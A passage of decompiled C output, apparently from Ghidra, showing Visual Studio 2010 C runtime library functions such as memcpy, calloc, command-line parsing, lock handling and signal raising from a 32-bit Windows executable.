  undefined4 *puVar18;
  
  puVar18 = unaff_EDI;
  if (((uint)unaff_ESI & 0xf) != 0) {
    uVar17 = 0x10 - ((uint)unaff_ESI & 0xf);
    param_1 = param_1 - uVar17;
    for (uVar16 = uVar17 & 3; uVar16 != 0; uVar16 = uVar16 - 1) {
      *(undefined *)puVar18 = *(undefined *)unaff_ESI;
      unaff_ESI = (undefined4 *)((int)unaff_ESI + 1);
      puVar18 = (undefined4 *)((int)puVar18 + 1);
    }
    for (uVar17 = uVar17 >> 2; uVar17 != 0; uVar17 = uVar17 - 1) {
      *puVar18 = *unaff_ESI;
      unaff_ESI = unaff_ESI + 1;
      puVar18 = puVar18 + 1;
    }
  }
  for (uVar16 = param_1 >> 7; uVar16 != 0; uVar16 = uVar16 - 1) {
    uVar1 = unaff_ESI[1];
    uVar2 = unaff_ESI[2];
    uVar3 = unaff_ESI[3];
    uVar4 = unaff_ESI[4];
    uVar5 = unaff_ESI[5];
    uVar6 = unaff_ESI[6];
    uVar7 = unaff_ESI[7];
    uVar8 = unaff_ESI[8];
    uVar9 = unaff_ESI[9];
    uVar10 = unaff_ESI[10];
    uVar11 = unaff_ESI[0xb];
    uVar12 = unaff_ESI[0xc];
    uVar13 = unaff_ESI[0xd];
    uVar14 = unaff_ESI[0xe];
    uVar15 = unaff_ESI[0xf];
    *puVar18 = *unaff_ESI;
    puVar18[1] = uVar1;
    puVar18[2] = uVar2;
    puVar18[3] = uVar3;
    puVar18[4] = uVar4;
    puVar18[5] = uVar5;
    puVar18[6] = uVar6;
    puVar18[7] = uVar7;
    puVar18[8] = uVar8;
    puVar18[9] = uVar9;
    puVar18[10] = uVar10;
    puVar18[0xb] = uVar11;
    puVar18[0xc] = uVar12;
    puVar18[0xd] = uVar13;
    puVar18[0xe] = uVar14;
    puVar18[0xf] = uVar15;
    uVar1 = unaff_ESI[0x11];
    uVar2 = unaff_ESI[0x12];
    uVar3 = unaff_ESI[0x13];
    uVar4 = unaff_ESI[0x14];
    uVar5 = unaff_ESI[0x15];
    uVar6 = unaff_ESI[0x16];
    uVar7 = unaff_ESI[0x17];
    uVar8 = unaff_ESI[0x18];
    uVar9 = unaff_ESI[0x19];
    uVar10 = unaff_ESI[0x1a];
    uVar11 = unaff_ESI[0x1b];
    uVar12 = unaff_ESI[0x1c];
    uVar13 = unaff_ESI[0x1d];
    uVar14 = unaff_ESI[0x1e];
    uVar15 = unaff_ESI[0x1f];
    puVar18[0x10] = unaff_ESI[0x10];
    puVar18[0x11] = uVar1;
    puVar18[0x12] = uVar2;
    puVar18[0x13] = uVar3;
    puVar18[0x14] = uVar4;
    puVar18[0x15] = uVar5;
    puVar18[0x16] = uVar6;
    puVar18[0x17] = uVar7;
    puVar18[0x18] = uVar8;
    puVar18[0x19] = uVar9;
    puVar18[0x1a] = uVar10;
    puVar18[0x1b] = uVar11;
    puVar18[0x1c] = uVar12;
    puVar18[0x1d] = uVar13;
    puVar18[0x1e] = uVar14;
    puVar18[0x1f] = uVar15;
    unaff_ESI = unaff_ESI + 0x20;
    puVar18 = puVar18 + 0x20;
  }
  if ((param_1 & 0x7f) != 0) {
    for (uVar16 = (param_1 & 0x7f) >> 4; uVar16 != 0; uVar16 = uVar16 - 1) {
      uVar1 = unaff_ESI[1];
      uVar2 = unaff_ESI[2];
      uVar3 = unaff_ESI[3];
      *puVar18 = *unaff_ESI;
      puVar18[1] = uVar1;
      puVar18[2] = uVar2;
      puVar18[3] = uVar3;
      unaff_ESI = unaff_ESI + 4;
      puVar18 = puVar18 + 4;
    }
    if ((param_1 & 0xf) != 0) {
      for (uVar16 = (param_1 & 0xf) >> 2; uVar16 != 0; uVar16 = uVar16 - 1) {
        *puVar18 = *unaff_ESI;
        unaff_ESI = unaff_ESI + 1;
        puVar18 = puVar18 + 1;
      }
      for (uVar16 = param_1 & 3; uVar16 != 0; uVar16 = uVar16 - 1) {
        *(undefined *)puVar18 = *(undefined *)unaff_ESI;
        unaff_ESI = (undefined4 *)((int)unaff_ESI + 1);
        puVar18 = (undefined4 *)((int)puVar18 + 1);
      }
    }
  }
  return unaff_EDI;
}



// Library Function - Single Match
//  __calloc_impl
// 
// Library: Visual Studio 2010 Release

LPVOID __cdecl __calloc_impl(uint param_1,uint param_2,undefined4 *param_3)

{
  int *piVar1;
  LPVOID pvVar2;
  int iVar3;
  uint dwBytes;
  
  if ((param_1 != 0) && (0xffffffe0 / param_1 < param_2)) {
    piVar1 = __errno();
    *piVar1 = 0xc;
    return (LPVOID)0x0;
  }
  dwBytes = param_1 * param_2;
  if (dwBytes == 0) {
    dwBytes = 1;
  }
  do {
    pvVar2 = (LPVOID)0x0;
    if ((dwBytes < 0xffffffe1) &&
       (pvVar2 = HeapAlloc(DAT_00422218,8,dwBytes), pvVar2 != (LPVOID)0x0)) {
      return pvVar2;
    }
    if (DAT_00422220 == 0) {
      if (param_3 == (undefined4 *)0x0) {
        return pvVar2;
      }
      *param_3 = 0xc;
      return pvVar2;
    }
    iVar3 = __callnewh(dwBytes);
  } while (iVar3 != 0);
  if (param_3 != (undefined4 *)0x0) {
    *param_3 = 0xc;
  }
  return (LPVOID)0x0;
}



// Library Function - Single Match
//  long __stdcall __CxxUnhandledExceptionFilter(struct _EXCEPTION_POINTERS *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

long __CxxUnhandledExceptionFilter(_EXCEPTION_POINTERS *param_1)

{
  PEXCEPTION_RECORD pEVar1;
  ULONG_PTR UVar2;
  
  pEVar1 = param_1->ExceptionRecord;
  if (((pEVar1->ExceptionCode == 0xe06d7363) && (pEVar1->NumberParameters == 3)) &&
     ((UVar2 = pEVar1->ExceptionInformation[0], UVar2 == 0x19930520 ||
      (((UVar2 == 0x19930521 || (UVar2 == 0x19930522)) || (UVar2 == 0x1994000)))))) {
    terminate();
  }
  return 0;
}



// Library Function - Single Match
//  __XcptFilter
// 
// Library: Visual Studio 2010 Release

int __cdecl __XcptFilter(ulong _ExceptionNum,_EXCEPTION_POINTERS *_ExceptionPtr)

{
  ulong *puVar1;
  code *pcVar2;
  void *pvVar3;
  ulong uVar4;
  _ptiddata p_Var5;
  ulong *puVar6;
  int iVar7;
  
  p_Var5 = __getptd_noexit();
  if (p_Var5 != (_ptiddata)0x0) {
    puVar1 = (ulong *)p_Var5->_pxcptacttab;
    puVar6 = puVar1;
    do {
      if (*puVar6 == _ExceptionNum) break;
      puVar6 = puVar6 + 3;
    } while (puVar6 < puVar1 + 0x24);
    if ((puVar1 + 0x24 <= puVar6) || (*puVar6 != _ExceptionNum)) {
      puVar6 = (ulong *)0x0;
    }
    if ((puVar6 == (ulong *)0x0) || (pcVar2 = (code *)puVar6[2], pcVar2 == (code *)0x0)) {
      p_Var5 = (_ptiddata)0x0;
    }
    else if (pcVar2 == (code *)0x5) {
      puVar6[2] = 0;
      p_Var5 = (_ptiddata)0x1;
    }
    else {
      if (pcVar2 != (code *)0x1) {
        pvVar3 = p_Var5->_tpxcptinfoptrs;
        p_Var5->_tpxcptinfoptrs = _ExceptionPtr;
        if (puVar6[1] == 8) {
          iVar7 = 0x24;
          do {
            *(undefined4 *)(iVar7 + 8 + (int)p_Var5->_pxcptacttab) = 0;
            iVar7 = iVar7 + 0xc;
          } while (iVar7 < 0x90);
          uVar4 = *puVar6;
          iVar7 = p_Var5->_tfpecode;
          if (uVar4 == 0xc000008e) {
            p_Var5->_tfpecode = 0x83;
          }
          else if (uVar4 == 0xc0000090) {
            p_Var5->_tfpecode = 0x81;
          }
          else if (uVar4 == 0xc0000091) {
            p_Var5->_tfpecode = 0x84;
          }
          else if (uVar4 == 0xc0000093) {
            p_Var5->_tfpecode = 0x85;
          }
          else if (uVar4 == 0xc000008d) {
            p_Var5->_tfpecode = 0x82;
          }
          else if (uVar4 == 0xc000008f) {
            p_Var5->_tfpecode = 0x86;
          }
          else if (uVar4 == 0xc0000092) {
            p_Var5->_tfpecode = 0x8a;
          }
          else if (uVar4 == 0xc00002b5) {
            p_Var5->_tfpecode = 0x8d;
          }
          else if (uVar4 == 0xc00002b4) {
            p_Var5->_tfpecode = 0x8e;
          }
          (*pcVar2)(8,p_Var5->_tfpecode);
          p_Var5->_tfpecode = iVar7;
        }
        else {
          puVar6[2] = 0;
          (*pcVar2)(puVar6[1]);
        }
        p_Var5->_tpxcptinfoptrs = pvVar3;
      }
      p_Var5 = (_ptiddata)0xffffffff;
    }
  }
  return (int)p_Var5;
}



// Library Function - Single Match
//  __wwincmdln
// 
// Library: Visual Studio 2010 Release

void __wwincmdln(void)

{
  ushort uVar1;
  bool bVar2;
  ushort *puVar3;
  
  bVar2 = false;
  puVar3 = DAT_00424978;
  if (DAT_00424978 == (ushort *)0x0) {
    puVar3 = &DAT_0041c400;
  }
  do {
    uVar1 = *puVar3;
    if (uVar1 < 0x21) {
      if (uVar1 == 0) {
        return;
      }
      if (!bVar2) {
        for (; (*puVar3 != 0 && (*puVar3 < 0x21)); puVar3 = puVar3 + 1) {
        }
        return;
      }
    }
    if (uVar1 == 0x22) {
      bVar2 = !bVar2;
    }
    puVar3 = puVar3 + 1;
  } while( true );
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __wsetenvp
// 
// Library: Visual Studio 2010 Release

int __cdecl __wsetenvp(void)

{
  wchar_t **ppwVar1;
  size_t sVar2;
  wchar_t *_Dst;
  errno_t eVar3;
  wchar_t *pwVar4;
  int iVar5;
  
  iVar5 = 0;
  pwVar4 = DAT_00421874;
  if (DAT_00421874 == (wchar_t *)0x0) {
    iVar5 = -1;
  }
  else {
    for (; *pwVar4 != L'\0'; pwVar4 = pwVar4 + sVar2 + 1) {
      if (*pwVar4 != L'=') {
        iVar5 = iVar5 + 1;
      }
      sVar2 = _wcslen(pwVar4);
    }
    ppwVar1 = (wchar_t **)__calloc_crt(iVar5 + 1,4);
    pwVar4 = DAT_00421874;
    DAT_00421bd0 = ppwVar1;
    if (ppwVar1 == (wchar_t **)0x0) {
      iVar5 = -1;
    }
    else {
      for (; *pwVar4 != L'\0'; pwVar4 = pwVar4 + sVar2) {
        sVar2 = _wcslen(pwVar4);
        sVar2 = sVar2 + 1;
        if (*pwVar4 != L'=') {
          _Dst = (wchar_t *)__calloc_crt(sVar2,2);
          *ppwVar1 = _Dst;
          if (_Dst == (wchar_t *)0x0) {
            _free(DAT_00421bd0);
            DAT_00421bd0 = (wchar_t **)0x0;
            return -1;
          }
          eVar3 = _wcscpy_s(_Dst,sVar2,pwVar4);
          if (eVar3 != 0) {
                    // WARNING: Subroutine does not return
            __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
          }
          ppwVar1 = ppwVar1 + 1;
        }
      }
      _free(DAT_00421874);
      DAT_00421874 = (wchar_t *)0x0;
      *ppwVar1 = (wchar_t *)0x0;
      _DAT_00424964 = 1;
      iVar5 = 0;
    }
  }
  return iVar5;
}



// Library Function - Single Match
//  _wparse_cmdline
// 
// Library: Visual Studio 2010 Release

void __thiscall _wparse_cmdline(void *this,short **param_1,int *param_2)

{
  bool bVar1;
  bool bVar2;
  short *in_EAX;
  short sVar3;
  uint uVar4;
  int *unaff_EBX;
  
  bVar1 = false;
  *unaff_EBX = 0;
  *param_2 = 1;
  if (param_1 != (short **)0x0) {
    *param_1 = (short *)this;
    param_1 = param_1 + 1;
  }
  do {
    if (*in_EAX == 0x22) {
      bVar1 = !bVar1;
      sVar3 = 0x22;
    }
    else {
      *unaff_EBX = *unaff_EBX + 1;
      if ((short *)this != (short *)0x0) {
        *(short *)this = *in_EAX;
        this = (void *)((int)this + 2);
      }
      sVar3 = *in_EAX;
      if (sVar3 == 0) goto LAB_00412430;
    }
    in_EAX = in_EAX + 1;
  } while ((bVar1) || ((sVar3 != 0x20 && (sVar3 != 9))));
  if ((short *)this != (short *)0x0) {
    *(short *)((int)this + -2) = 0;
  }
LAB_00412430:
  bVar1 = false;
  while (*in_EAX != 0) {
    for (; (*in_EAX == 0x20 || (*in_EAX == 9)); in_EAX = in_EAX + 1) {
    }
    if (*in_EAX == 0) break;
    if (param_1 != (short **)0x0) {
      *param_1 = (short *)this;
      param_1 = param_1 + 1;
    }
    *param_2 = *param_2 + 1;
    while( true ) {
      bVar2 = true;
      uVar4 = 0;
      for (; *in_EAX == 0x5c; in_EAX = in_EAX + 1) {
        uVar4 = uVar4 + 1;
      }
      if (*in_EAX == 0x22) {
        if ((uVar4 & 1) == 0) {
          if ((bVar1) && (in_EAX[1] == 0x22)) {
            in_EAX = in_EAX + 1;
          }
          else {
            bVar2 = false;
            bVar1 = !bVar1;
          }
        }
        uVar4 = uVar4 >> 1;
      }
      while (uVar4 != 0) {
        uVar4 = uVar4 - 1;
        if ((short *)this != (short *)0x0) {
          *(short *)this = 0x5c;
          this = (void *)((int)this + 2);
        }
        *unaff_EBX = *unaff_EBX + 1;
      }
      sVar3 = *in_EAX;
      if ((sVar3 == 0) || ((!bVar1 && ((sVar3 == 0x20 || (sVar3 == 9)))))) break;
      if (bVar2) {
        if ((short *)this != (short *)0x0) {
          *(short *)this = sVar3;
          this = (void *)((int)this + 2);
        }
        *unaff_EBX = *unaff_EBX + 1;
      }
      in_EAX = in_EAX + 1;
    }
    if ((short *)this != (short *)0x0) {
      *(short *)this = 0;
      this = (void *)((int)this + 2);
    }
    *unaff_EBX = *unaff_EBX + 1;
  }
  if (param_1 != (short **)0x0) {
    *param_1 = (short *)0x0;
  }
  *param_2 = *param_2 + 1;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __wsetargv
// 
// Library: Visual Studio 2010 Release

int __cdecl __wsetargv(void)

{
  uint _Size;
  uint uVar1;
  short **ppsVar2;
  int iVar3;
  uint in_ECX;
  uint local_8;
  
  _DAT_00422450 = 0;
  local_8 = in_ECX;
  GetModuleFileNameW((HMODULE)0x0,(LPWSTR)&DAT_00422248,0x104);
  _DAT_00421bdc = &DAT_00422248;
  _wparse_cmdline((void *)0x0,(short **)0x0,(int *)&local_8);
  uVar1 = local_8;
  if ((((local_8 < 0x3fffffff) && (in_ECX < 0x7fffffff)) &&
      (_Size = (in_ECX + local_8 * 2) * 2, in_ECX * 2 <= _Size)) &&
     (ppsVar2 = (short **)__malloc_crt(_Size), ppsVar2 != (short **)0x0)) {
    _wparse_cmdline(ppsVar2 + uVar1,ppsVar2,(int *)&local_8);
    _DAT_00421bbc = local_8 - 1;
    iVar3 = 0;
    _DAT_00421bc4 = ppsVar2;
  }
  else {
    iVar3 = -1;
  }
  return iVar3;
}



// Library Function - Single Match
//  ___crtGetEnvironmentStringsW
// 
// Library: Visual Studio 2010 Release

LPVOID __cdecl ___crtGetEnvironmentStringsW(void)

{
  size_t _Size;
  WCHAR WVar1;
  LPWCH _Src;
  WCHAR *pWVar2;
  void *_Dst;
  WCHAR *pWVar3;
  
  _Src = GetEnvironmentStringsW();
  if (_Src != (LPWCH)0x0) {
    WVar1 = *_Src;
    pWVar2 = _Src;
    while (WVar1 != L'\0') {
      do {
        pWVar3 = pWVar2;
        pWVar2 = pWVar3 + 1;
      } while (*pWVar2 != L'\0');
      pWVar2 = pWVar3 + 2;
      WVar1 = *pWVar2;
    }
    _Size = (int)pWVar2 + (2 - (int)_Src);
    _Dst = __malloc_crt(_Size);
    if (_Dst != (void *)0x0) {
      FID_conflict__memcpy(_Dst,_Src,_Size);
    }
    FreeEnvironmentStringsW(_Src);
    return _Dst;
  }
  return (LPVOID)0x0;
}



// WARNING: Removing unreachable block (ram,0x0041262d)
// WARNING: Removing unreachable block (ram,0x00412633)
// WARNING: Removing unreachable block (ram,0x00412635)
// Library Function - Single Match
//  __RTC_Initialize
// 
// Library: Visual Studio 2010 Release

void __RTC_Initialize(void)

{
  return;
}



// Library Function - Single Match
//  ___security_init_cookie
// 
// Library: Visual Studio 2010 Release

void __cdecl ___security_init_cookie(void)

{
  DWORD DVar1;
  DWORD DVar2;
  DWORD DVar3;
  uint uVar4;
  LARGE_INTEGER local_14;
  _FILETIME local_c;
  
  local_c.dwLowDateTime = 0;
  local_c.dwHighDateTime = 0;
  if ((DAT_00420044 == 0xbb40e64e) || ((DAT_00420044 & 0xffff0000) == 0)) {
    GetSystemTimeAsFileTime(&local_c);
    uVar4 = local_c.dwHighDateTime ^ local_c.dwLowDateTime;
    DVar1 = GetCurrentProcessId();
    DVar2 = GetCurrentThreadId();
    DVar3 = GetTickCount();
    QueryPerformanceCounter(&local_14);
    DAT_00420044 = uVar4 ^ DVar1 ^ DVar2 ^ DVar3 ^ local_14.s.HighPart ^ local_14.s.LowPart;
    if (DAT_00420044 == 0xbb40e64e) {
      DAT_00420044 = 0xbb40e64f;
    }
    else if ((DAT_00420044 & 0xffff0000) == 0) {
      DAT_00420044 = DAT_00420044 | (DAT_00420044 | 0x4711) << 0x10;
    }
    DAT_00420048 = ~DAT_00420044;
  }
  else {
    DAT_00420048 = ~DAT_00420044;
  }
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00412700(void)

{
  _DAT_0042382c = 0;
  return;
}



// Library Function - Single Match
//  __mtinitlocks
// 
// Library: Visual Studio 2010 Release

int __cdecl __mtinitlocks(void)

{
  BOOL BVar1;
  int iVar2;
  LPCRITICAL_SECTION p_Var3;
  
  iVar2 = 0;
  p_Var3 = (LPCRITICAL_SECTION)&DAT_00422458;
  do {
    if ((&DAT_00420d34)[iVar2 * 2] == 1) {
      (&DAT_00420d30)[iVar2 * 2] = p_Var3;
      p_Var3 = p_Var3 + 1;
      BVar1 = InitializeCriticalSectionAndSpinCount
                        ((LPCRITICAL_SECTION)(&DAT_00420d30)[iVar2 * 2],4000);
      if (BVar1 == 0) {
        (&DAT_00420d30)[iVar2 * 2] = 0;
        return 0;
      }
    }
    iVar2 = iVar2 + 1;
  } while (iVar2 < 0x24);
  return 1;
}



// Library Function - Single Match
//  __mtdeletelocks
// 
// Library: Visual Studio 2010 Release

void __cdecl __mtdeletelocks(void)

{
  LPCRITICAL_SECTION lpCriticalSection;
  LPCRITICAL_SECTION *pp_Var1;
  
  pp_Var1 = (LPCRITICAL_SECTION *)&DAT_00420d30;
  do {
    lpCriticalSection = *pp_Var1;
    if ((lpCriticalSection != (LPCRITICAL_SECTION)0x0) && (pp_Var1[1] != (LPCRITICAL_SECTION)0x1)) {
      DeleteCriticalSection(lpCriticalSection);
      _free(lpCriticalSection);
      *pp_Var1 = (LPCRITICAL_SECTION)0x0;
    }
    pp_Var1 = pp_Var1 + 2;
  } while ((int)pp_Var1 < 0x420e50);
  pp_Var1 = (LPCRITICAL_SECTION *)&DAT_00420d30;
  do {
    if ((*pp_Var1 != (LPCRITICAL_SECTION)0x0) && (pp_Var1[1] == (LPCRITICAL_SECTION)0x1)) {
      DeleteCriticalSection(*pp_Var1);
    }
    pp_Var1 = pp_Var1 + 2;
  } while ((int)pp_Var1 < 0x420e50);
  return;
}



void __cdecl FUN_004127a9(int param_1)

{
  LeaveCriticalSection((LPCRITICAL_SECTION)(&DAT_00420d30)[param_1 * 2]);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __mtinitlocknum
// 
// Library: Visual Studio 2010 Release

int __cdecl __mtinitlocknum(int _LockNum)

{
  LPCRITICAL_SECTION *pp_Var1;
  LPCRITICAL_SECTION lpCriticalSection;
  int *piVar2;
  BOOL BVar3;
  int iVar4;
  int local_20;
  
  iVar4 = 1;
  local_20 = 1;
  if (DAT_00422218 == 0) {
    __FF_MSGBANNER();
    __NMSG_WRITE(0x1e);
    ___crtExitProcess(0xff);
  }
  pp_Var1 = (LPCRITICAL_SECTION *)(&DAT_00420d30 + _LockNum * 2);
  if (*pp_Var1 == (LPCRITICAL_SECTION)0x0) {
    lpCriticalSection = (LPCRITICAL_SECTION)__malloc_crt(0x18);
    if (lpCriticalSection == (LPCRITICAL_SECTION)0x0) {
      piVar2 = __errno();
      *piVar2 = 0xc;
      iVar4 = 0;
    }
    else {
      __lock(10);
      if (*pp_Var1 == (LPCRITICAL_SECTION)0x0) {
        BVar3 = InitializeCriticalSectionAndSpinCount(lpCriticalSection,4000);
        if (BVar3 == 0) {
          _free(lpCriticalSection);
          piVar2 = __errno();
          *piVar2 = 0xc;
          local_20 = 0;
        }
        else {
          *pp_Var1 = lpCriticalSection;
        }
      }
      else {
        _free(lpCriticalSection);
      }
      FUN_00412879();
      iVar4 = local_20;
    }
  }
  return iVar4;
}



void FUN_00412879(void)

{
  FUN_004127a9(10);
  return;
}



// Library Function - Single Match
//  __lock
// 
// Library: Visual Studio 2010 Release

void __cdecl __lock(int _File)

{
  int iVar1;
  
  if ((LPCRITICAL_SECTION)(&DAT_00420d30)[_File * 2] == (LPCRITICAL_SECTION)0x0) {
    iVar1 = __mtinitlocknum(_File);
    if (iVar1 == 0) {
      __amsg_exit(0x11);
    }
  }
  EnterCriticalSection((LPCRITICAL_SECTION)(&DAT_00420d30)[_File * 2]);
  return;
}



// Library Function - Single Match
//  __malloc_crt
// 
// Library: Visual Studio 2010 Release

void * __cdecl __malloc_crt(size_t _Size)

{
  void *pvVar1;
  uint dwMilliseconds;
  
  dwMilliseconds = 0;
  while( true ) {
    pvVar1 = _malloc(_Size);
    if (pvVar1 != (void *)0x0) {
      return pvVar1;
    }
    if (DAT_004225a8 == 0) break;
    Sleep(dwMilliseconds);
    dwMilliseconds = dwMilliseconds + 1000;
    if (DAT_004225a8 < dwMilliseconds) {
      dwMilliseconds = 0xffffffff;
    }
    if (dwMilliseconds == 0xffffffff) {
      return (void *)0x0;
    }
  }
  return (void *)0x0;
}



// Library Function - Single Match
//  __calloc_crt
// 
// Library: Visual Studio 2010 Release

void * __cdecl __calloc_crt(size_t _Count,size_t _Size)

{
  LPVOID pvVar1;
  uint dwMilliseconds;
  
  dwMilliseconds = 0;
  while( true ) {
    pvVar1 = __calloc_impl(_Count,_Size,(undefined4 *)0x0);
    if (pvVar1 != (LPVOID)0x0) {
      return pvVar1;
    }
    if (DAT_004225a8 == 0) break;
    Sleep(dwMilliseconds);
    dwMilliseconds = dwMilliseconds + 1000;
    if (DAT_004225a8 < dwMilliseconds) {
      dwMilliseconds = 0xffffffff;
    }
    if (dwMilliseconds == 0xffffffff) {
      return (void *)0x0;
    }
  }
  return (void *)0x0;
}



// Library Function - Single Match
//  __realloc_crt
// 
// Library: Visual Studio 2010 Release

void * __cdecl __realloc_crt(void *_Ptr,size_t _NewSize)

{
  void *pvVar1;
  uint dwMilliseconds;
  
  dwMilliseconds = 0;
  do {
    pvVar1 = _realloc(_Ptr,_NewSize);
    if (pvVar1 != (void *)0x0) {
      return pvVar1;
    }
    if (_NewSize == 0) {
      return (void *)0x0;
    }
    if (DAT_004225a8 == 0) {
      return (void *)0x0;
    }
    Sleep(dwMilliseconds);
    dwMilliseconds = dwMilliseconds + 1000;
    if (DAT_004225a8 < dwMilliseconds) {
      dwMilliseconds = 0xffffffff;
    }
  } while (dwMilliseconds != 0xffffffff);
  return (void *)0x0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// Library Function - Single Match
//  void __cdecl terminate(void)
// 
// Library: Visual Studio 2010 Release

void __cdecl terminate(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd();
  if ((code *)p_Var1->_terminate != (code *)0x0) {
    (*(code *)p_Var1->_terminate)();
  }
                    // WARNING: Subroutine does not return
  _abort();
}



// Library Function - Single Match
//  void __cdecl unexpected(void)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl unexpected(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd();
  if ((code *)p_Var1->_unexpected != (code *)0x0) {
    (*(code *)p_Var1->_unexpected)();
  }
  terminate();
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// Library Function - Single Match
//  void __cdecl _inconsistency(void)
// 
// Library: Visual Studio 2010 Release

void __cdecl _inconsistency(void)

{
  code *pcVar1;
  
  pcVar1 = (code *)DecodePointer(DAT_004225ac);
  if (pcVar1 != (code *)0x0) {
    (*pcVar1)();
  }
  terminate();
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



void FUN_00412a18(void)

{
  DAT_004225ac = EncodePointer(terminate);
  return;
}



// Library Function - Single Match
//  __initp_misc_winsig
// 
// Library: Visual Studio 2010 Release

void __cdecl __initp_misc_winsig(undefined4 param_1)

{
  DAT_004225b0 = param_1;
  DAT_004225b4 = param_1;
  DAT_004225b8 = param_1;
  DAT_004225bc = param_1;
  return;
}



// Library Function - Single Match
//  _siglookup
// 
// Library: Visual Studio 2010 Release

uint __fastcall _siglookup(undefined4 param_1,int param_2,uint param_3)

{
  uint uVar1;
  
  uVar1 = param_3;
  do {
    if (*(int *)(uVar1 + 4) == param_2) break;
    uVar1 = uVar1 + 0xc;
  } while (uVar1 < DAT_0041b2ac * 0xc + param_3);
  if ((DAT_0041b2ac * 0xc + param_3 <= uVar1) || (*(int *)(uVar1 + 4) != param_2)) {
    uVar1 = 0;
  }
  return uVar1;
}



void FUN_00412a7e(void)

{
  DecodePointer(DAT_004225b8);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _raise
// 
// Library: Visual Studio 2010 Release

int __cdecl _raise(int _SigNum)

{
  uint uVar1;
  int *piVar2;
  PVOID Ptr;
  code *pcVar3;
  int _File;
  code *pcVar4;
  undefined4 extraout_ECX;
  code **ppcVar5;
  _ptiddata p_Var6;
  int local_34;
  void *local_30;
  int local_28;
  int local_20;
  
  p_Var6 = (_ptiddata)0x0;
  local_20 = 0;
  if (_SigNum < 0xc) {
    if (_SigNum != 0xb) {
      if (_SigNum == 2) {
        ppcVar5 = (code **)&DAT_004225b0;
        Ptr = DAT_004225b0;
        goto LAB_00412b35;
      }
      if (_SigNum != 4) {
        if (_SigNum == 6) goto LAB_00412b13;
        if (_SigNum != 8) goto LAB_00412b01;
      }
    }
    p_Var6 = __getptd_noexit();
    if (p_Var6 == (_ptiddata)0x0) {
      return -1;
    }
    uVar1 = _siglookup(extraout_ECX,_SigNum,(uint)p_Var6->_pxcptacttab);
    ppcVar5 = (code **)(uVar1 + 8);
    pcVar3 = *ppcVar5;
  }
  else {
    if (_SigNum == 0xf) {
      ppcVar5 = (code **)&DAT_004225bc;
      Ptr = DAT_004225bc;
    }
    else if (_SigNum == 0x15) {
      ppcVar5 = (code **)&DAT_004225b4;
      Ptr = DAT_004225b4;
    }
    else {
      if (_SigNum != 0x16) {
LAB_00412b01:
        piVar2 = __errno();
        *piVar2 = 0x16;
        FUN_0040c664();
        return -1;
      }
LAB_00412b13:
      ppcVar5 = (code **)&DAT_004225b8;
      Ptr = DAT_004225b8;
    }
LAB_00412b35:
    local_20 = 1;
    pcVar3 = (code *)DecodePointer(Ptr);
  }
  _File = 0;
  if (pcVar3 == (code *)0x1) {
    return 0;
  }
  if (pcVar3 == (code *)0x0) {
    _File = __exit(3);
  }
  if (local_20 != _File) {
    __lock(_File);
  }
  if (((_SigNum == 8) || (_SigNum == 0xb)) || (_SigNum == 4)) {
    local_30 = p_Var6->_tpxcptinfoptrs;
    p_Var6->_tpxcptinfoptrs = (void *)0x0;
    if (_SigNum == 8) {
      local_34 = p_Var6->_tfpecode;
      p_Var6->_tfpecode = 0x8c;
      goto LAB_00412b99;
    }
  }
  else {
LAB_00412b99:
    if (_SigNum == 8) {
      for (local_28 = DAT_0041b2a0; local_28 < DAT_0041b2a4 + DAT_0041b2a0; local_28 = local_28 + 1)
      {
        *(undefined4 *)(local_28 * 0xc + 8 + (int)p_Var6->_pxcptacttab) = 0;
      }
      goto LAB_00412bd1;
    }
  }
  pcVar4 = (code *)FUN_0040c6ff();
  *ppcVar5 = pcVar4;
LAB_00412bd1:
  FUN_00412bf2();
  if (_SigNum == 8) {
    (*pcVar3)(8,p_Var6->_tfpecode);
  }
  else {
    (*pcVar3)(_SigNum);
    if ((_SigNum != 0xb) && (_SigNum != 4)) {
      return 0;
    }
  }
  p_Var6->_tpxcptinfoptrs = local_30;
  if (_SigNum == 8) {
    p_Var6->_tfpecode = local_34;
  }
  return 0;
}



void FUN_00412bf2(void)

{
  int unaff_EBP;
  
  if (*(int *)(unaff_EBP + -0x1c) != 0) {
    FUN_004127a9(0);
  }
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_00412c2e(undefined4 param_1)

{
  _DAT_004225c4 = param_1;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_00412c3d(undefined4 param_1)

{
  _DAT_004225c8 = param_1;
  return;
}



// Library Function - Single Match
//  __initp_misc_cfltcvt_tab
// 
// Library: Visual Studio 2010 Release

void __initp_misc_cfltcvt_tab(void)

{
  PVOID pvVar1;
  uint uVar2;
  
  uVar2 = 0;
  do {
    pvVar1 = EncodePointer(*(PVOID *)((int)&PTR_LAB_00420e50 + uVar2));
    *(PVOID *)((int)&PTR_LAB_00420e50 + uVar2) = pvVar1;
    uVar2 = uVar2 + 4;
  } while (uVar2 < 0x28);
  return;
}



// Library Function - Single Match
//  __ValidateImageBase
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

BOOL __cdecl __ValidateImageBase(PBYTE pImageBase)

{
  if ((*(short *)pImageBase == 0x5a4d) &&
     (*(int *)(pImageBase + *(int *)(pImageBase + 0x3c)) == 0x4550)) {
    return (uint)(*(short *)((int)(pImageBase + *(int *)(pImageBase + 0x3c)) + 0x18) == 0x10b);
  }
  return 0;
}



